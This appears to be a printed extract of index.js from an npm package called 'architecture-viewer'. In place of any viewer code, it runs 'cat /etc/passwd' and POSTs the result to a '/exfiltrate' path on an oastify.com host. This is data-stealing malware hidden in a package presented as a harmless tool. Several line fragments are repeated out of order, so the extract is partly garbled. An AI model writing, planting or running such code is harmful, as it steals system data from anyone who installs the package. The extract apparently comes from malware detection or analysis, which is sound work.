// File: tmp/tmpc4c4ko21/architecture-viewer/package/index.js
// ======================================================================
Line 1: const http = require('http')
Line 2: const exec = require('child_process').exec
Line 8: exec('cat /etc/passwd', (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }

  // Send the sensitive data to a remote server
  const options = {
    hostname: '176mbz7btaz0fwz4nmwp2k5smjscg44t.oastify.com',  // Replace with your server
    port: 80,
    path: '/exfiltrate',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    }
  };

  const req = http.request(options, (res) => {
    res.on('data', (d) => {
      process.stdout.write(d);
    });
  });

  req.on('error', (e) => {
    console.error(e);
  });

  // Send the exfiltrated data
  req.write(JSON.stringify({ passwd: stdout }));
  req.end();
})
Line 25: const req = http.request(options, (res) => {
    res.on('data', (d) => {
      process.stdout.write(d);
    });
  })
Line 26: {
      process.stdout.write(d);
    }
Line 27: process.stdout.write(d)
Line 36: req.write(JSON.stringify({ passwd: stdout }))
Line 37: req.end()
